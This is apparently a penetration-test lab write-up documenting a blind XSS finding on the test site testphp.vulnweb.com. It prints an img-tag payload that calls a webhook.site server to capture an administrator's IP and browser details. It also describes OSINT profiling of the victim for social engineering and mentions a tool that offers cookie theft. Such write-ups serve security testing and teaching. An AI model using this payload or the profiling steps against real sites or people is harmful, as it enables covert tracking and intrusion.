> **English** | [Italiano](README.md)

# Blind XSS / Out-of-Band (OOB) Interaction

> - **Phase:** Web Attack - Blind XSS / Out-of-Band
> - **Visibility:** Zero on the attacker side - the payload is injected blindly and only activates when another person (e.g., admin) views the infected data
> - **Prerequisites:** Input field that is later displayed in a different context (admin panel, logs, email), external OOB service (webhook.site, XSS Hunter)
> - **Output:** HTTP callback towards attacker server, admin's IP and User-Agent, vulnerability confirmation in hidden area, finding WEB-007

---

**Finding ID:** `WEB-007` | **Severity:** `High` | **CVSS v3.1:** 8.2

---

## 1 Concept

Blind XSS (or Out-of-Band interaction) occurs when the attacker injects a payload into a system without being able to see the immediate effect (no popup on screen).

The objective is to make the vulnerable application "call" an external server controlled by the attacker, revealing that the code was executed.

---

## 2 Attack Simulation

#### Payload Construction

Due to input field length restrictions, an HTML Injection payload was used targeting a network request to a listening server (C2).

Payload (The "Ping"):

```html
<img src="https://webhook.site/ef87a183-83c5-4229-a7fe-xxxxxxxxxxxxxxxxxx">
```

Execution

- The payload was injected in the "Address" field of the user profile.
- When the victim (or admin) views the profile, the browser attempts to render the image.
- Since the image source points to the attacker's server, an automatic HTTP request is generated.

Evidence (Callback Received)

The screenshot below shows the attacker's control panel (Webhook.site) receiving the request.

The Referer field (`http://testphp.vulnweb.com/`) confirms that the attack was successful and the request originated from the victim site.

![](./img/Screenshot_2026-02-15_23_51_00.jpg)

---

## 3 Impact Analysis

Although this specific payload does not exfiltrate cookies, it demonstrates the ability to:

- Track users: Obtain the IP address and User-Agent (Browser/OS) of whoever views the profile (Fingerprinting).
- Verify the vulnerability: Confirm the field is vulnerable to XSS/Injection without visually alerting the victim.

---

## 4 Post-Exploitation: OSINT Analysis

Using the exfiltrated data (particularly the victim's IP address), it is possible to conduct an Open Source Intelligence (OSINT) phase to geolocate and identify the target organization.

Procedure:

The IP address obtained through the XSS payload was analyzed using WHOIS Lookup tools.

Results:

The attacker can trace:

- ISP/Organization: Identification of the internet service provider or company owning the network.
- Geolocation: Approximate victim location.
- Technical Contacts: In some cases, emails and phone numbers of network administrators (useful for subsequent Social Engineering attacks).

---

## MITRE ATT&CK Mapping

| Tactic | Technique | MITRE ID | Action Description |
| :--- | :--- | :--- | :--- |
| Initial Access | Exploit Public-Facing Application | `T1190` | Injection of OOB payload (`<img src="https://webhook.site/...">`) in the user profile "Address" field, activating when the admin views the profile (WEB-007) |
| Collection | Browser Session Hijacking | `T1185` | The OOB callback received on webhook.site reveals the administrator's browser and IP, opening the path to specific targeting (WEB-007) |
| Reconnaissance | Gather Victim Identity Information | `T1589` | Analysis of received OOB data (IP, User-Agent, Referer) to identify the admin's ISP, geolocation and browser type (WEB-007) |

---

> **Note:** Finding WEB-007 was documented on `testphp.vulnweb.com` using webhook.site as OOB service to receive the callback. The payload used is HTML Injection (img tag) instead of pure JavaScript, because the field had length limitations. The Referer in the callback confirmed the origin from `testphp.vulnweb.com`. In a real engagement, XSS Hunter Pro (https://xsshunter.trufflesecurity.com/) provides more advanced OOB functionality including victim browser cookie theft and screenshots.
